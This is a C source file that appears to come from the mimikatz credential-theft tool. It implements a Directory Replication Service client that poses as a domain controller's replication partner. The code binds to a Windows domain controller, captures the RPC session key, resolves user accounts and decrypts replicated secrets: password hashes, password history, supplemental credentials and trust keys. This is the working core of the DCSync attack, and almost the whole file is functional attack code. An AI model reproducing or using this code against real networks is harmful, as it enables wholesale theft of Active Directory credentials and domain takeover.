/*	Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com / http://blog.gentilkiwi.com )
	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kull_m_rpc_drsr.h"

void __RPC_FAR * __RPC_USER midl_user_allocate(size_t cBytes)
{
	void __RPC_FAR * ptr = NULL;
	if(ptr = malloc(cBytes))
		RtlZeroMemory(ptr, cBytes);
	return ptr;
}

void __RPC_USER midl_user_free(void __RPC_FAR * p)
{
	free(p);
}

SecPkgContext_SessionKey kull_m_rpc_drsr_g_sKey = {0, NULL};
void RPC_ENTRY kull_m_rpc_drsr_RpcSecurityCallback(void *Context)
{
	RPC_STATUS rpcStatus;
	SECURITY_STATUS secStatus;
	PCtxtHandle data = NULL;

	rpcStatus = I_RpcBindingInqSecurityContext(Context, (LPVOID *) &data);
	if(rpcStatus == RPC_S_OK)
	{
		if(kull_m_rpc_drsr_g_sKey.SessionKey)
		{
			FreeContextBuffer(kull_m_rpc_drsr_g_sKey.SessionKey);
			kull_m_rpc_drsr_g_sKey.SessionKeyLength = 0;
			kull_m_rpc_drsr_g_sKey.SessionKey = NULL;
		}
		secStatus = QueryContextAttributes(data, SECPKG_ATTR_SESSION_KEY, (LPVOID) &kull_m_rpc_drsr_g_sKey);
		if(secStatus != SEC_E_OK)
			PRINT_ERROR(L"QueryContextAttributes %08x\n", secStatus);
	}
	else PRINT_ERROR(L"I_RpcBindingInqSecurityContext %08x\n", rpcStatus);
}

const wchar_t PREFIX_LDAP[] = L"ldap/";
BOOL kull_m_rpc_drsr_createBinding(LPCWSTR server, RPC_BINDING_HANDLE *hBinding)
{
	BOOL status = FALSE;
	RPC_STATUS rpcStatus;
	RPC_WSTR StringBinding = NULL;
	RPC_SECURITY_QOS SecurityQOS = {RPC_C_SECURITY_QOS_VERSION, RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH, RPC_C_QOS_IDENTITY_STATIC, RPC_C_IMP_LEVEL_DEFAULT};
	LPWSTR fullServer;
	DWORD szServer = (DWORD) (wcslen(server) * sizeof(wchar_t)), szPrefix = sizeof(PREFIX_LDAP); // includes NULL;

	*hBinding = NULL;
	rpcStatus = RpcStringBindingCompose(NULL, (RPC_WSTR) L"ncacn_ip_tcp", (RPC_WSTR) server, NULL, NULL, &StringBinding);
	if(rpcStatus == RPC_S_OK)
	{
		rpcStatus = RpcBindingFromStringBinding(StringBinding, hBinding);
		if(rpcStatus == RPC_S_OK)
		{
			if(*hBinding)
			{
				if(fullServer = (LPWSTR) LocalAlloc(LPTR, szPrefix + szServer))
				{
					RtlCopyMemory(fullServer, PREFIX_LDAP, szPrefix);
					RtlCopyMemory((PBYTE) fullServer + (szPrefix - sizeof(wchar_t)), server, szServer);
					rpcStatus = RpcBindingSetAuthInfoEx(*hBinding, (RPC_WSTR) fullServer, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_VISTA) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, 0, &SecurityQOS);
					if(rpcStatus == RPC_S_OK)
					{
						rpcStatus = RpcBindingSetOption(*hBinding, RPC_C_OPT_SECURITY_CALLBACK, (ULONG_PTR) kull_m_rpc_drsr_RpcSecurityCallback);
						status = (rpcStatus == RPC_S_OK);
						if(!status)
							PRINT_ERROR(L"RpcBindingSetOption: 0x%08x (%u)\n", rpcStatus, rpcStatus);
					}
					else PRINT_ERROR(L"RpcBindingSetAuthInfoEx: 0x%08x (%u)\n", rpcStatus, rpcStatus);
					LocalFree(fullServer);
				}
			}
			else PRINT_ERROR(L"No Binding!\n");
		}
		else PRINT_ERROR(L"RpcBindingFromStringBinding: 0x%08x (%u)\n", rpcStatus, rpcStatus);
		RpcStringFree(&StringBinding);
	}
	else PRINT_ERROR(L"RpcStringBindingCompose: 0x%08x (%u)\n", rpcStatus, rpcStatus);
	return status;
}

BOOL kull_m_rpc_drsr_deleteBinding(RPC_BINDING_HANDLE *hBinding)
{
	BOOL status = FALSE;
	if(status = (RpcBindingFree(hBinding) == RPC_S_OK))
		*hBinding = NULL;
	return status;
}

GUID DRSUAPI_DS_BIND_GUID_Standard	= {0xe24d201a, 0x4fd6, 0x11d1, {0xa3, 0xda, 0x00, 0x00, 0xf8, 0x75, 0xae, 0x0d}};
BOOL kull_m_rpc_drsr_getDomainAndUserInfos(RPC_BINDING_HANDLE *hBinding, LPCWSTR ServerName, LPCWSTR Domain, GUID *DomainGUID, LPCWSTR User, LPCWSTR Guid, GUID *UserGuid, DWORD *dwReplEpoch, GUID *SiteObjGuid, GUID *ConfigObjGUID)
{
	BOOL DomainGUIDfound = FALSE, ObjectGUIDfound = FALSE;
	DWORD i;
	ULONG drsStatus;
	DRS_HANDLE hDrs = NULL;
	DRS_MSG_DCINFOREQ dcInfoReq = {0};
	DWORD dcOutVersion = 0;
	DRS_MSG_DCINFOREPLY dcInfoRep = {0};
	LPWSTR sGuid;
	UNICODE_STRING uGuid;

	*dwReplEpoch = 0;
	RtlZeroMemory(SiteObjGuid, sizeof(GUID));
	RtlZeroMemory(ConfigObjGUID, sizeof(GUID));
	
	if(kull_m_rpc_drsr_getDCBind(hBinding, &DRSUAPI_DS_BIND_GUID_Standard, &hDrs, dwReplEpoch, SiteObjGuid, ConfigObjGUID))
	{
		RpcTryExcept
		{
			dcInfoReq.V1.InfoLevel = 2;
			dcInfoReq.V1.Domain = (LPWSTR) Domain;
			drsStatus = IDL_DRSDomainControllerInfo(hDrs, 1, &dcInfoReq, &dcOutVersion, &dcInfoRep);
			if(drsStatus == 0)
			{
				if(dcOutVersion == 2)
				{
					for(i = 0; i < dcInfoRep.V2.cItems; i++)
					{
						if(!DomainGUIDfound && ((_wcsicmp(ServerName, dcInfoRep.V2.rItems[i].DnsHostName) == 0) || (_wcsicmp(ServerName, dcInfoRep.V2.rItems[i].NetbiosName) == 0)))
						{
							DomainGUIDfound = TRUE;
							*DomainGUID = dcInfoRep.V2.rItems[i].NtdsDsaObjectGuid;
						}
					}
					if(!DomainGUIDfound)
						PRINT_ERROR(L"DomainControllerInfo: DC \'%s\' not found\n", ServerName);
				}
				else PRINT_ERROR(L"DomainControllerInfo: bad version (%u)\n", dcOutVersion);
				kull_m_rpc_drsr_free_DRS_MSG_DCINFOREPLY_data(dcOutVersion, &dcInfoRep);
			}
			else PRINT_ERROR(L"DomainControllerInfo: 0x%08x (%u)\n", drsStatus, drsStatus);

			if(Guid)
			{
				RtlInitUnicodeString(&uGuid, Guid);
				ObjectGUIDfound = NT_SUCCESS(RtlGUIDFromString(&uGuid, UserGuid));
			}
			else if(User)
			{
				if(kull_m_rpc_drsr_CrackName(hDrs, wcschr(User, L'\\') ? DS_NT4_ACCOUNT_NAME : wcschr(User, L'=') ? DS_FQDN_1779_NAME : wcschr(User, L'@') ? DS_USER_PRINCIPAL_NAME : DS_NT4_ACCOUNT_NAME_SANS_DOMAIN, User, DS_UNIQUE_ID_NAME, &sGuid, NULL))
				{
					RtlInitUnicodeString(&uGuid, sGuid);
					ObjectGUIDfound = NT_SUCCESS(RtlGUIDFromString(&uGuid, UserGuid));
				}
			}
		}
		RpcExcept(DRS_EXCEPTION)
			PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
		RpcEndExcept

	}
	return (DomainGUIDfound && (ObjectGUIDfound || !(Guid || User)));
}

BOOL kull_m_rpc_drsr_getDCBind(RPC_BINDING_HANDLE *hBinding, GUID *NtdsDsaObjectGuid, DRS_HANDLE *hDrs, DWORD *dwReplEpoch, GUID *SiteObjGuid, GUID *ConfigObjGUID)
{
	BOOL status = FALSE;
	ULONG drsStatus;
	DRS_EXTENSIONS_INT DrsExtensionsInt = {0};
	DRS_EXTENSIONS_INT *pDrsExtensionsOutput = NULL;

	DrsExtensionsInt.cb = sizeof(DRS_EXTENSIONS_INT) - sizeof(DWORD);
	DrsExtensionsInt.dwFlags = DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_STRONG_ENCRYPTION;
	DrsExtensionsInt.SiteObjGuid = *SiteObjGuid;
	DrsExtensionsInt.dwReplEpoch = *dwReplEpoch;
	DrsExtensionsInt.ConfigObjGUID = *ConfigObjGUID;

	RpcTryExcept
	{
		drsStatus = IDL_DRSBind(*hBinding, NtdsDsaObjectGuid, (DRS_EXTENSIONS *) &DrsExtensionsInt, (DRS_EXTENSIONS **) &pDrsExtensionsOutput, hDrs); // to free ?
		if(drsStatus == 0)
		{
			if(pDrsExtensionsOutput)
			{
				if(pDrsExtensionsOutput->cb >= FIELD_OFFSET(DRS_EXTENSIONS_INT, SiteObjGuid) - sizeof(DWORD))
				{
					if(pDrsExtensionsOutput->dwFlags & (DRS_EXT_GETCHGREQ_V8 | DRS_EXT_STRONG_ENCRYPTION))
						status = TRUE;
					else PRINT_ERROR(L"Incorrect DRS Extensions Output (%08x)\n", pDrsExtensionsOutput->dwFlags);

					if(pDrsExtensionsOutput->cb >= FIELD_OFFSET(DRS_EXTENSIONS_INT, Pid) - sizeof(DWORD))
					{
						*SiteObjGuid = pDrsExtensionsOutput->SiteObjGuid;
						if(pDrsExtensionsOutput->cb >= FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt) - sizeof(DWORD))
						{
							*dwReplEpoch = pDrsExtensionsOutput->dwReplEpoch;
							if(pDrsExtensionsOutput->cb >= FIELD_OFFSET(DRS_EXTENSIONS_INT, dwExtCaps) - sizeof(DWORD))
								*ConfigObjGUID = pDrsExtensionsOutput->ConfigObjGUID;
						}
					}
				}
				else PRINT_ERROR(L"Incorrect DRS Extensions Output Size (%u)\n", pDrsExtensionsOutput->cb);
				MIDL_user_free(pDrsExtensionsOutput);
			}
			else PRINT_ERROR(L"No DRS Extensions Output\n");

			if(!status)
				IDL_DRSUnbind(hDrs);
		}
		else PRINT_ERROR(L"IDL_DRSBind: %u\n", drsStatus);
	}
	RpcExcept(DRS_EXCEPTION)
		PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
	RpcEndExcept
		return status;
}

const wchar_t * KULL_M_RPC_DRSR_CrackNames_Error[] = {L"NO_ERROR", L"ERROR_RESOLVING", L"ERROR_NOT_FOUND", L"ERROR_NOT_UNIQUE", L"ERROR_NO_MAPPING", L"ERROR_DOMAIN_ONLY", L"ERROR_NO_SYNTACTICAL_MAPPING", L"ERROR_TRUST_REFERRAL"};
BOOL kull_m_rpc_drsr_CrackName(DRS_HANDLE hDrs, DS_NAME_FORMAT NameFormat, LPCWSTR Name, DS_NAME_FORMAT FormatWanted, LPWSTR *CrackedName, LPWSTR *CrackedDomain)
{
	BOOL status = FALSE;
	DRS_MSG_CRACKREQ nameCrackReq = {0};
	DWORD nameCrackOutVersion = 0, drsStatus;
	DRS_MSG_CRACKREPLY nameCrackRep = {0};

	nameCrackReq.V1.formatOffered = NameFormat;
	nameCrackReq.V1.formatDesired = FormatWanted;
	nameCrackReq.V1.cNames = 1;
	nameCrackReq.V1.rpNames = (LPWSTR *) &Name;

	RpcTryExcept
	{
		drsStatus = IDL_DRSCrackNames(hDrs, 1, &nameCrackReq, &nameCrackOutVersion, &nameCrackRep);
		if(drsStatus == 0)
		{
			if(nameCrackOutVersion == 1)
			{
				if(nameCrackRep.V1.pResult->cItems == 1)
				{
					drsStatus = nameCrackRep.V1.pResult->rItems[0].status;
					if(status = (drsStatus == DS_NAME_NO_ERROR))
					{
						kull_m_string_copy(CrackedName, nameCrackRep.V1.pResult->rItems[0].pName);
						kull_m_string_copy(CrackedDomain, nameCrackRep.V1.pResult->rItems[0].pDomain);
					}
					else PRINT_ERROR(L"CrackNames (name status): 0x%08x (%u) - %s\n", drsStatus, drsStatus, (drsStatus < ARRAYSIZE(KULL_M_RPC_DRSR_CrackNames_Error)) ? KULL_M_RPC_DRSR_CrackNames_Error[drsStatus] : L"?");
				}
				else PRINT_ERROR(L"CrackNames: no item!\n");
			}
			else PRINT_ERROR(L"CrackNames: bad version (%u)\n", nameCrackOutVersion);
			kull_m_rpc_drsr_free_DRS_MSG_CRACKREPLY_data(nameCrackOutVersion, &nameCrackRep);
		}
		else PRINT_ERROR(L"CrackNames: 0x%08x (%u)\n", drsStatus, drsStatus);
	}
	RpcExcept(DRS_EXCEPTION)
		PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
	RpcEndExcept

	return status;
}

BOOL kull_m_rpc_drsr_ProcessGetNCChangesReply(REPLENTINFLIST *objects) // very partial, ofc
{
	REPLENTINFLIST * pReplentinflist, *pNextReplentinflist = objects;
	DWORD i, j;
	while(pReplentinflist = pNextReplentinflist)
	{
		pNextReplentinflist = pReplentinflist->pNextEntInf;
		if(pReplentinflist->Entinf.AttrBlock.pAttr)
		{
			for(i = 0; i < pReplentinflist->Entinf.AttrBlock.attrCount; i++)
			{
				switch(pReplentinflist->Entinf.AttrBlock.pAttr[i].attrTyp)
				{
				case ATT_CURRENT_VALUE:
				case ATT_UNICODE_PWD:
				case ATT_NT_PWD_HISTORY:
				case ATT_DBCS_PWD:
				case ATT_LM_PWD_HISTORY:
				case ATT_SUPPLEMENTAL_CREDENTIALS:
				case ATT_TRUST_AUTH_INCOMING:
				case ATT_TRUST_AUTH_OUTGOING:
				// case another :
				// case another :
					if(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal)
						for(j = 0; j < pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.valCount; j++)
							if(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[j].pVal)
								if(!kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt(&pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[j]))
									return FALSE;
					break;
				default:
					break;
				}
			}
		}
	}
	return TRUE;
}

BOOL kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt(ATTRVAL *val)
{
	BOOL status = FALSE;
	PENCRYPTED_PAYLOAD encrypted;
	MD5_CTX md5ctx;
	CRYPTO_BUFFER cryptoKey = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, NULL}, cryptoData;
	DWORD realLen, calcChecksum;
	PVOID toFree;

	if(kull_m_rpc_drsr_g_sKey.SessionKey && kull_m_rpc_drsr_g_sKey.SessionKeyLength)
	{
		if((val->valLen >= (ULONG) FIELD_OFFSET(ENCRYPTED_PAYLOAD, EncryptedData)) && val->pVal)
		{
			encrypted = (PENCRYPTED_PAYLOAD) val->pVal;
			MD5Init(&md5ctx);
			MD5Update(&md5ctx, kull_m_rpc_drsr_g_sKey.SessionKey, kull_m_rpc_drsr_g_sKey.SessionKeyLength);
			MD5Update(&md5ctx, encrypted->Salt, sizeof(encrypted->Salt));
			MD5Final(&md5ctx);
			cryptoKey.Buffer = md5ctx.digest;

			cryptoData.Length = cryptoData.MaximumLength = val->valLen - FIELD_OFFSET(ENCRYPTED_PAYLOAD, CheckSum);
			cryptoData.Buffer = (PBYTE) &encrypted->CheckSum;

			if(NT_SUCCESS(RtlEncryptDecryptRC4(&cryptoData, &cryptoKey)))
			{
				realLen = val->valLen - FIELD_OFFSET(ENCRYPTED_PAYLOAD, EncryptedData);
				if(kull_m_crypto_hash(CALG_CRC32, encrypted->EncryptedData, realLen, &calcChecksum, sizeof(calcChecksum)))
				{
					if(calcChecksum == encrypted->CheckSum)
					{
						toFree = val->pVal;
						if(val->pVal = (UCHAR *) MIDL_user_allocate(realLen))
						{
							RtlCopyMemory(val->pVal, encrypted->EncryptedData, realLen);
							val->valLen = realLen;
							status = TRUE;
							MIDL_user_free(toFree);
						}
					}
					else PRINT_ERROR(L"Checksums don\'t match (C:0x%08x - R:0x%08x)\n", calcChecksum, encrypted->CheckSum);
				}
				else PRINT_ERROR(L"Unable to calculate CRC32\n");
			}
			else PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
		}
		else PRINT_ERROR(L"No valid data\n");
	}
	else PRINT_ERROR(L"No Session Key\n");
	return status;
}

void kull_m_rpc_drsr_free_DRS_MSG_CRACKREPLY_data(DWORD nameCrackOutVersion, DRS_MSG_CRACKREPLY * reply)
{
	DWORD i;
	if(reply)
	{
		switch (nameCrackOutVersion)
		{
		case 1:
			if(reply->V1.pResult)
			{
				for(i = 0; i < reply->V1.pResult->cItems; i++)
				{
					if(reply->V1.pResult->rItems[i].pDomain)
						MIDL_user_free(reply->V1.pResult->rItems[i].pDomain);
					if(reply->V1.pResult->rItems[i].pName)
						MIDL_user_free(reply->V1.pResult->rItems[i].pName);
				}
				if(reply->V1.pResult->rItems)
					MIDL_user_free(reply->V1.pResult->rItems);
				MIDL_user_free(reply->V1.pResult);
			}
			break;
		default:
			PRINT_ERROR(L"nameCrackOutVersion not valid (0x%08x - %u)\n", nameCrackOutVersion, nameCrackOutVersion);
			break;
		}
	}
}

void kull_m_rpc_drsr_free_DRS_MSG_DCINFOREPLY_data(DWORD dcOutVersion, DRS_MSG_DCINFOREPLY * reply)
{
	DWORD i;
	if(reply)
	{
		switch (dcOutVersion)
		{
		case 2:
			for(i = 0; i < reply->V2.cItems; i++)
			{
				if(reply->V2.rItems[i].NetbiosName)
					MIDL_user_free(reply->V2.rItems[i].NetbiosName);
				if(reply->V2.rItems[i].DnsHostName)
					MIDL_user_free(reply->V2.rItems[i].DnsHostName);
				if(reply->V2.rItems[i].SiteName)
					MIDL_user_free(reply->V2.rItems[i].SiteName);
				if(reply->V2.rItems[i].SiteObjectName)
					MIDL_user_free(reply->V2.rItems[i].SiteObjectName);
				if(reply->V2.rItems[i].ComputerObjectName)
					MIDL_user_free(reply->V2.rItems[i].ComputerObjectName);
				if(reply->V2.rItems[i].ServerObjectName)
					MIDL_user_free(reply->V2.rItems[i].ServerObjectName);
				if(reply->V2.rItems[i].NtdsDsaObjectName)
					MIDL_user_free(reply->V2.rItems[i].NtdsDsaObjectName);
			}
			if(reply->V2.rItems)
				MIDL_user_free(reply->V2.rItems);
			break;
		case 1:
		case 3:
		case 0xffffffff:
			PRINT_ERROR(L"TODO (maybe?)\n");
			break;
		default:
			PRINT_ERROR(L"dcOutVersion not valid (0x%08x - %u)\n", dcOutVersion, dcOutVersion);
			break;
		}
	}
}

void kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data(DWORD dwOutVersion, DRS_MSG_GETCHGREPLY * reply)
{
	DWORD i, j;
	REPLENTINFLIST *pReplentinflist, *pNextReplentinflist;
	if(reply)
	{
		switch(dwOutVersion)
		{
		case 6:
			if(reply->V6.pNC)
				MIDL_user_free(reply->V6.pNC);
			if(reply->V6.pUpToDateVecSrc)
				MIDL_user_free(reply->V6.pUpToDateVecSrc);
			if(reply->V6.PrefixTableSrc.pPrefixEntry)
			{
				for(i = 0; i < reply->V6.PrefixTableSrc.PrefixCount; i++)
					if(reply->V6.PrefixTableSrc.pPrefixEntry[i].prefix.elements)
						MIDL_user_free(reply->V6.PrefixTableSrc.pPrefixEntry[i].prefix.elements);
				MIDL_user_free(reply->V6.PrefixTableSrc.pPrefixEntry);
			}
			pNextReplentinflist = reply->V6.pObjects;
			while(pReplentinflist = pNextReplentinflist)
			{
				pNextReplentinflist = pReplentinflist->pNextEntInf;
				if(pReplentinflist->Entinf.pName)
					MIDL_user_free(pReplentinflist->Entinf.pName);
				if(pReplentinflist->Entinf.AttrBlock.pAttr)
				{
					for(i = 0; i < pReplentinflist->Entinf.AttrBlock.attrCount; i++)
					{
						if(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal)
						{
							for(j = 0; j < pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.valCount; j++)
								if(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[j].pVal)
									MIDL_user_free(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[j].pVal);
							MIDL_user_free(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal);
						}
					}
					MIDL_user_free(pReplentinflist->Entinf.AttrBlock.pAttr);
				}
				if(pReplentinflist->pParentGuid)
					MIDL_user_free(pReplentinflist->pParentGuid);
				if(pReplentinflist->pMetaDataExt)
					MIDL_user_free(pReplentinflist->pMetaDataExt);
				MIDL_user_free(pReplentinflist);
			}
			if(reply->V6.rgValues)
			{
				for(i = 0; i < reply->V6.cNumValues; i++)
				{
					if(reply->V6.rgValues[i].pObject)
						MIDL_user_free(reply->V6.rgValues[i].pObject);
					if(reply->V6.rgValues[i].Aval.pVal)
						MIDL_user_free(reply->V6.rgValues[i].Aval.pVal);
				}
				MIDL_user_free(reply->V6.rgValues);
			}
			break;
		case 1:
		case 2:
		case 7:
		case 9:
			PRINT_ERROR(L"TODO (maybe?)\n");
			break;
		default:
			PRINT_ERROR(L"dwOutVersion not valid (0x%08x - %u)\n", dwOutVersion, dwOutVersion);
			break;
		}
	}
}